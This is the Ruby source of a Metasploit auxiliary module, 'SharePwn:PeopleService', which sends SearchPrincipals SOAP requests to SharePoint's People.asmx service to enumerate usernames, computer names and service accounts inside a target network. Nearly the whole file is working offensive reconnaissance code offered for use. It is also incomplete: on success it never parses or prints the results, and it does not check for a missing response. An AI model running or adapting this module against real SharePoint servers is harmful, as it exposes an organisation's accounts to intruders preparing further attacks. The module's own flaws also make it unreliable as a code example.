##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'   		=> 'SharePwn:PeopleService - SharePoint Network/Account Enumeration',
      'Description'	=> %q{
        This SharePwn module abuses the functionality of the People.asmx service in order to identify usernames,
        computer names, and service accounts that exist within the target internal network.
      },
      'Author' 		=> 'J Parsons "0rigen" <0rigen [at] 0rigen.net>',
      'License'		=> MSF_LICENSE)
    )

    register_options(
      [
        OptString.new('PATH', [ false,  "The target's SharePoint path, if not at webroot", '/']),
        OptString.new('SEARCHSTRING', [true, "Text to search for", '$']),
        OptString.new('RESULTS', [true, "Number of results to request", '100']),
        OptString.new('SOAPVERSION', [true, "SOAP Version to use (1.1 or 1.2)", '1.1']),
        Opt::RPORT(80)
      ], self.class)

    deregister_options('THREADS')

  end

  def run
    connect

    tpath = normalize_uri(datastore['PATH'])

    if (tpath[-1,1] != '/')
      tpath += '/'
    end
    if (tpath == '/')
      tpath =""
    end

    tpath = tpath + "/_vti_bin/People.asmx"

    prot  = datastore['SSL'] ? 'https' : 'http'

    r = build_request

    if(datastore['SOAPVERSION'].to_s == '1.2')
      print_status("Requesting " + tpath)
      res = send_request_cgi({
        'uri'     =>  tpath,
        'method'    => 'POST',
        'ctype'   => 'text/xml; charset=utf-8',
        'data' => r
      }, 20)
    end

    # SOAP 1.1 Requires an additional SOAPAction header
    if(datastore['SOAPVERSION'].to_s != '1.2')
      print_status("Requesting " + tpath)
      res = send_request_cgi({
        'uri'      =>  tpath,
        'headers' => { 'SOAPAction' => "http://schemas.microsoft.com/sharepoint/soap/SearchPrincipals" },
        'method'     => 'POST',
        'ctype'    => 'text/xml; charset=utf-8',
        'data' => r
      }, 20)
    end

    if (res.code.to_s == '404')
      print_error("Got HTTP Code <" + res.code.to_s + " Not Found>.  Check your URL and SharePoint Path. ")
    end
    if (res.code.to_s == '401') or (res.code.to_s == '403')
      print_error("Got HTTP Code <" + res.code.to_s + ">  You're going to need credentials.")
    end

  end #end run_host

  #
  #  Create XML POST Payload
  #
  def build_request
    xml = ""

    oneone_header = 'SOAPAction: "http://schemas.microsoft.com/sharepoint/soap/ResolvePrincipals'
    oneone = %q{
              <?xml version="1.0" encoding="utf-8"?>
              <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                <soap:Body>
                  <SearchPrincipals xmlns="http://schemas.microsoft.com/sharepoint/soap/">
                    <searchText>{{searchText}}</searchText>
                    <maxResults>{{maxRes}}</maxResults>
                    <principalType>All</principalType>
                  </SearchPrincipals>
                </soap:Body>
              </soap:Envelope>
              }

    onetwo = %q{
            <?xml version="1.0" encoding="utf-8"?>
            <soap12:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://www.w3.org/2003/05/soap-envelope">
              <soap12:Body>
                <SearchPrincipals xmlns="http://schemas.microsoft.com/sharepoint/soap/">
                  <searchText>{{searchText}}</searchText>
                  <maxResults>{{maxRes}}</maxResults>
                  <principalType>All</principalType>
                </SearchPrincipals>
              </soap12:Body>
            </soap12:Envelope>
            }

    if (datastore['SOAPVERSION'] == '1.2')
      xml = onetwo
    end
    if (datastore['SOAPVERSION'] == '1.1')
      xml = oneone
    end

    # Replace {{ID}} fields with user-defined options
    xml ["{{searchText}}"] = datastore['SEARCHSTRING']
    xml ["{{maxRes}}"] = datastore['RESULTS'].to_s

    # Return the data
    xml

  end #end build_request

end #end class